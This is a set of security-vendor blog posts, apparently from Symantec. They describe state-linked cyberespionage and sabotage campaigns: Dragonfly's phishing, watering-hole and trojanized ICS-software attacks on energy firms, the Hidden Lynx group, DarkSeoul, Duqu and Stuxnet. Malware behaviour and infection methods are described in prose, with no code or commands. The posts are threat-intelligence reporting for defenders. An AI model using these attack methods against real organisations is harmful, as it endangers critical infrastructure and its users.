    "text": "An ongoing cyberespionage campaign against a range of targets, mainly in the energy sector, gave attackers the ability to mount sabotage operations against their victims. The attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes and, if they had used the sabotage capabilities open to them, could have caused damage or disruption to energy supplies in affected countries. Among the targets of Dragonfly were energy grid operators, major electricity generation firms, petroleum pipeline operators, and energy industry industrial equipment providers. The majority of the victims were located in the United States, Spain, France, Italy, Germany, Turkey, and Poland. The Dragonfly group is well resourced, with a range of malware tools at its disposal and is capable of launching attacks through a number of different vectors. Its most ambitious attack campaign saw it compromise a number of industrial control system (ICS) equipment providers, infecting their software with a remote access-type Trojan. This caused companies to install the malware when downloading software updates for computers running ICS equipment. These infections not only gave the attackers a beachhead in the targeted organizations’ networks, but also gave them the means to mount sabotage operations against infected ICS computers. This campaign follows in the footsteps of Stuxnet, which was the first known major malware campaign to target ICS systems. While Stuxnet was narrowly targeted at the Iranian nuclear program and had sabotage as its primary goal, Dragonfly appears to have a much broader focus with espionage and persistent access as its current objective with sabotage as an optional capability if required. In addition to compromising ICS software, Dragonfly has used spam email campaigns and watering hole attacks to infect targeted organizations. The group has used two main malware tools: Backdoor. Oldrea and Trojan. Karagany. The former appears to be a custom piece of malware, either written by or for the attackers. Prior to publication, Symantec notified affected victims and relevant national authorities, such as Computer Emergency Response Centers (CERTs) that handle and respond to Internet security incidents. The Dragonfly group, which is also known by other vendors as Energetic Bear, appears to have been in operation since at least 2011 and may have been active even longer than that. Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus mainly to US and European energy firms in early 2013. The campaign against the European and American energy sector quickly expanded in scope. The group initially began sending malware in phishing emails to personnel in target firms. Later, the group added watering hole attacks to its offensive, compromising websites likely to be visited by those working in energy in order to redirect them to websites hosting an exploit kit. The exploit kit in turn delivered malware to the victim’s computer. The third phase of the campaign was the Trojanizing of legitimate software bundles belonging to three different ICS equipment manufacturers. Dragonfly bears the hallmarks of a state-sponsored operation, displaying a high degree of technical capability. The group is able to mount attacks through multiple vectors and compromise numerous third party websites in the process. Dragonfly has targeted multiple organizations in the energy sector over a long period of time. Its current main motive appears to be cyberespionage, with potential for sabotage a definite secondary capability. Analysis of the compilation timestamps on the malware used by the attackers indicate that the group mostly worked between Monday and Friday, with activity mainly concentrated in a nine-hour period that corresponded to a 9am to 6pm working day in the UTC +4 time zone. Based on this information, it is likely the attackers are based in Eastern Europe. Dragonfly uses two main pieces of malware in its attacks. Both are remote access tool (RAT) type malware which provide the attackers with access and control of compromised computers. Dragonfly’s favored malware tool is Backdoor. Oldrea, which is also known as Havex or the Energetic Bear RAT. Oldrea acts as a back door for the attackers on to the victim’s computer, allowing them to extract data and install further malware. Oldrea appears to be custom malware, either written by the group itself or created for it. This provides some indication of the capabilities and resources behind the Dragonfly group. Once installed on a victim’s computer, Oldrea gathers system information, along with lists of files, programs installed, and root of available drives. It will also extract data from the computer’s Outlook address book and VPN configuration files. This data is then written to a temporary file in an encrypted format before being sent to a remote command-and-control (C&C) server controlled by the attackers. The majority of C&C servers appear to be hosted on compromised servers running content management systems, indicating that the attackers may have used the same exploit to gain control of each server. Oldrea has a basic control panel which allows an authenticated user to download a compressed version of the stolen data for each particular victim. The second main tool used by Dragonfly is Trojan. Karagany. Unlike Oldrea, Karagany was available on the underground market. The source code for version 1 of Karagany was leaked in 2010. Symantec believes that Dragonfly may have taken this source code and modified it for its own use. This version is detected by Symantec as Trojan. Karagany!gen1. Karagany is capable of uploading stolen data, downloading new files, and running executable files on an infected computer. It is also capable of running additional plugins, such as tools for collecting passwords, taking screenshots, and cataloging documents on infected computers. Symantec found that the majority of computers compromised by the attackers were infected with Oldrea. Karagany was only used in around 5 percent of infections. The two pieces of malware are similar in functionality and what prompts the attackers to choose one tool over another remains unknown. The Dragonfly group has used at least three infection tactics against targets in the energy sector. The earliest method was an email campaign, which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment. Infected emails had one of two subject lines: “The account” or “Settlement of delivery problem”. All of the emails were from a single Gmail address. The spam campaign began in February 2013 and continued into June 2013. Symantec identified seven different organizations targeted in this campaign. The number of emails sent to each organization ranged from one to 84. The attackers then shifted their focus to watering hole attacks, comprising a number of energy-related websites and injecting an iframe into each which redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit. Lightsout exploits either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim’s computer. The fact that the attackers compromised multiple legitimate websites for each stage of the operation is further evidence that the group has strong technical capabilities. In September 2013, Dragonfly began using a new version of this exploit kit, known as the Hello exploit kit. The landing page for this kit contains JavaScript which fingerprints the system, identifying installed browser plugins. The victim is then redirected to a URL which in turn determines the best exploit to use based on the information collected. The most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software packages. Three different ICS equipment providers were targeted and malware was inserted into the software bundles they had made available for download on their websites. All three companies made equipment that is used in a number of industrial sectors, including energy. The first identified Trojanized software was a product used to provide VPN access to programmable logic controller (PLC) type devices. The vendor discovered the attack shortly after it was mounted, but there had already been 250 unique downloads of the compromised software. The second company to be compromised was a European manufacturer of specialist PLC type devices. In this instance, a software package containing a driver for one of its devices was compromised. Symantec estimates that the Trojanized software was available for download for at least six weeks in June and July 2013. The third firm attacked was a European company which develops systems to manage wind turbines, biogas plants, and other energy infrastructure. Symantec believes that compromised software may have been available for download for approximately ten days in April 2014. The Dragonfly group is technically adept and able to think strategically. Given the size of some of its targets, the group found a “soft underbelly” by compromising their suppliers, which are invariably smaller, less protected companies.

    "text": "For the past few years, reports have continued to emerge detailing the activities of actors behind various targeted attacks or Advanced Persistent Threats (APTs). Here at Symantec Security Response, we’ve been keeping our eyes on a group that we believe are among the best of breed. We’ve given them the name of Hidden Lynx—after a string that was found in the command and control server communications. This group has a hunger and drive that surpass other well-known groups such as APT1/Comment Crew. Key characteristics of this group are: These attributes are shown by the relentless campaigns waged against multiple concurrent targets over a sustained period of time. They are the pioneers of the “watering hole” technique used to ambush targets, they have early access to zero-day vulnerabilities, and they have the tenacity and patience of an intelligent hunter to compromise the supply chain to get at the true target. These supply chain attacks are carried out by infecting computers at a supplier of an intended target and then waiting for the infected computers to be installed and call home, clearly these are cool calculated actions rather than impulsive forays of amateurs. This group doesn’t just limit itself to a handful of targets; instead it targets hundreds of different organizations in many different regions, even concurrently. Given the breadth and number of targets and regions involved, we infer that this group is most likely a professional hacker-for-hire operation that are contracted by clients to provide information. They steal on demand, whatever their clients are interested in, hence the wide variety and range of targets. We also believe that to carry out attacks of this scale, the group must have considerable hacking expertise at its disposal, perhaps 50 to 100 operatives are employed and organized into at least two distinct teams both tasked with carrying out different activities using different tools and techniques. These types of attacks require time and effort to carry out, some of the campaigns require research and intelligence gathering before any successful attacks can be mounted. At the front line of this group is a team that uses disposable tools along with basic but effective techniques to attack many different targets. They may also act as intelligence collectors too. This team we call Team Moudoor after the name of the Trojan that they use. Moudoor is a back door Trojan that the team uses liberally without worry about discovery by security firms. The other team acts like a special operations unit, elite personnel used to crack the most valuable or toughest targets. The elite team uses a Trojan named Naid and are therefore referred to as Team Naid. Unlike Moudoor, the Naid Trojan is used sparingly and with care to avoid detection and capture, like a secret weapon that is only used when failure is not an option. Since 2011, we have observed at least six significant campaigns by this group. The most notable of these campaigns is the VOHO attack campaign of June, 2012. What was particularly interesting about this attack was the use of the watering hole attack technique and the compromise of Bit9’s trusted file signing infrastructure. The VOHO campaign was ultimately targeting US defense contractors whose systems were protected by Bit9’s trust-based protection software but when the Hidden Lynx attackers’ progress was blocked by this obstacle, they reconsidered their options and found that the best way around the protection was to compromise the heart of the protection system itself and subvert it for their own purpose. This is exactly what they did when they diverted their attention to Bit9 and breached their systems. Once breached, the attackers quickly found their way into the file signing infrastructure that was the foundation of the Bit9 protection model, they then used this system to sign a number of malware files and then these files were used in turn to compromise the true intended targets. For those interested in more in-depth information, we havepublished a whitepaperthat describes the group and the attack campaigns carried out by them. We have also put together an infographic that summarizes the key information about this prolific Hidden Lynx group.

    "text": "Yesterday, June 25, the Korean peninsula observed a series of cyberattacks coinciding with the 63rd anniversary of the start of the Korean War. While multiple attacks were conducted by multiple perpetrators, one of the distributed denial-of-service (DDoS) attacks observed yesterday against South Korean government websites can be directly linked to the DarkSeoul gang and Trojan. Castov. We can now attribute multiple previous high-profile attacks to the DarkSeoul gang over the last 4 years against South Korea, in addition to yesterday’s attack. These attacks include the devastatingJokra attacksin March 2013 that wiped numerous computer hard drives at South Korean banks and television broadcasters, as well as theattacks on South Korean financial companiesin May 2013. Conducting DDoS attacks and hard disk wiping on key historical dates is not new for the DarkSeoul gang. They previously conducted DDoS and wiping attacks on the United States Independence Day as well. The DarkSeoul gang’s attacks tend to follow similar methods of operation. Trademarks of their attacks include: The attacks conducted by the DarkSeoul gang have required intelligence and coordination, and in some cases have demonstrated technical sophistication. While nation-state attribution is difficult, South Koreanmedia reportshave pointed to an investigation which concluded the attackers were working on behalf of North Korea. Symantec expects the DarkSeoul attacks to continue and, regardless of whether the gang is working on behalf of North Korea or not, the attacks are both politically motivated and have the necessary financial support to continue acts of cybersabotage on organizations in South Korea. Cybersabotage attacks on a national scale have been rare—Stuxnet and Shamoon (W32. Disttrack) are the other two main examples. However, the DarkSeoul gang is almost unique in its ability to carry out such high-profile and damaging attacks over several years.

    "text": "On October 14, 2011, a research lab with strong international connections alerted us to a sample that appeared to be very similar to Stuxnet. They named the threat \"Duqu\" [dyü-kyü] because it creates files with the file name prefix “~DQ”. The research lab provided us with samples recovered from computer systems located in Europe, as well as a detailed report with their initial findings, including analysis comparing the threat to Stuxnet, which we were able to confirm. Parts of Duqu are nearly identical to Stuxnet, but with a completely different purpose. Duqu is essentially the precursor to a future Stuxnet-like attack. The threat was written by the same authors (or those that have access to the Stuxnet source code) and appears to have been created since the last Stuxnet file was recovered. Duqu's purpose is to gather intelligence data and assets from entities, such as industrial control system manufacturers, in order to more easily conduct a future attack against another third party. The attackers are looking for information such as design documents that could help them mount a future attack on an industrial control facility. Duqu does not contain any code related to industrial control systems and is primarily a remote access Trojan (RAT). The threat does not self-replicate. Our telemetry shows the threat was highly targeted toward a limited number of organizations for their specific assets. However, it’s possible that other attacks are being conducted against other organizations in a similar manner with currently undetected variants. The attackers used Duqu to install another infostealer that could record keystrokes and gain other system information. The attackers were searching for assets that could be used in a future attack. In one case, the attackers did not appear to successfully exfiltrate any sensitive data, but details are not available in all cases. Two variants were recovered, and in reviewing our archive of submissions, the first recording of one of the binaries was on September 1, 2011. However, based on file compile times, attacks using these variants may have been conducted as early as December 2010. One of the variant’s driver files was signed with a valid digital certificate that expires August 2, 2012. The digital certificate belongs to a company headquartered in Taipei, Taiwan. The certificate was revoked on October 14, 2011. Duqu uses HTTP and HTTPS to communicate with a command-and-control (C&C) server that at the time of writing is still operational. The attackers were able to download additional executables through the C&C server, including an infostealer that can perform actions such as enumerating the network, recording keystrokes, and gathering system information. The information is logged to a lightly encrypted and compressed local file, which then must be exfiltrated out. The threat uses a custom C&C protocol, primarily downloading or uploading what appear to be JPG files. However, in addition to transferring dummy JPG files, additional data for exfiltration is encrypted and sent, and likewise received. Finally, the threat is configured to run for 36 days. After 36 days, the threat will automatically remove itself from the system. Duqu shares a great deal of code with Stuxnet; however, the payload is completely different. Instead of a payload designed to sabotage an industrial control system, the payload has been replaced with general remote access capabilities. The creators of Duqu had access to the source code of Stuxnet, not just the Stuxnet binaries. The attackers intend to use this capability to gather intelligence from a private entity to aid future attacks on a third party. While suspected, no similar precursor files have been recovered that predate the Stuxnet attacks. You can find additional details inour paper here. The research lab that originally found the sample has allowed us to share their initial report as an appendix. We expect to make further updates over the coming days. Key points: Note: At press time we have recovered additional variants from an additional organization in Europe with a compilation time of October 17, 2011. These variants have not yet been analyzed. More information will follow. Update [October 18, 2011] -Symantec has known that some of the malware files associated with the W32. Duqu threat were signed with private keys associated with a code signing certificate issued to a Symantec customer. Symantec revoked the customer certificate in question on October 14, 2011. Our investigation into the key’s usage leads us to the conclusion that the private key used for signing Duqu was stolen, and not fraudulently generated for the purpose of this malware. At no time were Symantec’s roots and intermediate CAs at risk, nor were there any issues with any CA, intermediate, or other VeriSign or Thawte brands of certificates. Our investigation shows zero evidence of any risk to our systems; we used the correct processes to authenticate and issue the certificate in question to a legitimate customer in Taiwan.

    "text": "We’re pleased to announce that we’ve compiled the results of many weeks of fast-paced analysis of Stuxnet into awhite paper entitled the W32. Stuxnet Dossier. On top of finding elements we described in the ongoing Stuxnet summer blog series, you will find all technical details about the threat’s components and data structures, as well as high-level information, including: The paper is scheduled to be delivered at the Virus Bulletin 2010 conference and can be downloaded here. Our investigations into Stuxnet started on July 13 of this year when the Symantec Security Response team began a journey full of surprises, wrong turns, frustrating moments, and moments of validation. Virusblokada, a security company in Belarus, announced they found a new interesting malware sample using an unpatched vulnerability to spread to removable drives and much of the media focused on the zero-day vulnerability. However, there was much more. Soon people began describing a threat now known as Stuxnet as a tool for cyber espionage stealing design data for industrial control systems, such as gas pipelines and power plants. Stuxnet then had difficulty shedding those initial reports with most only noting its use of a zero-day exploit and its ability to potentially steal design documents. Only more recently did the general public realize Stuxnet’s ultimate goal was to sabotage an industrial control system. Analyzing Stuxnet has been one of the most challenging issues we have worked on. The code is sophisticated, incredibly large, required numerous experts in different fields, and mostly bug-free, which is rare for your average piece of malware. Stuxnet is clearly not average. We estimate the core team was five to ten people and they developed Stuxnet over six months. The development was in all likelihood highly organized and thus this estimate doesn’t include the quality assurance and management resources needed to organize the development as well as a probable host of other resources required, such as people to setup test systems to mirror the target environment and maintain the command and control server. When looking through our archive, we were able to find a sample from June 2009. Therefore the attackers had been active for at least a year. We would not be surprised if they started even prior to that. Typical threats attack virtual or individual assets like credit card numbers. The real-world implications of Stuxnet are beyond any threat we have seen in the past and despite the exciting challenge in reverse engineering Stuxnet and understanding its purpose, Stuxnet is the type of threat we hope to never see again. In addition, we want to acknowledge the entire Symantec Security Response Team. Analyzing Stuxnet was a huge effort that involved many individuals who worked tirelessly to uncover Stuxnet’s ultimate motivation. Without each individual’s contribution, our exclusive analysis would have not been possible. Finally, while we believe we have uncovered all the major and even minor details of Stuxnet, the ultimate target of Stuxnet remains unknown. We have reversed and extracted all the STL code used, but the STL code does not provide any context of what it is controlling in the real world. For those that aren’t familiar with ICS systems, essentially the STL code will set a certain address to a number. But what is behind that address – a pump, a centrifuge, a conveyor belt – cannot be seen from the code. However, we suspect there might be some common constructs, such as certain values you’d only see when activating a centrifuge versus a pump used in STL coding that might give more clues to the target. Therefore if you are a verifiable expert in STL coding that has worked in multiple critical infrastructure industries and coded large STL programs for large industrial control systems in those multiple industries and wish to help, please contact me.
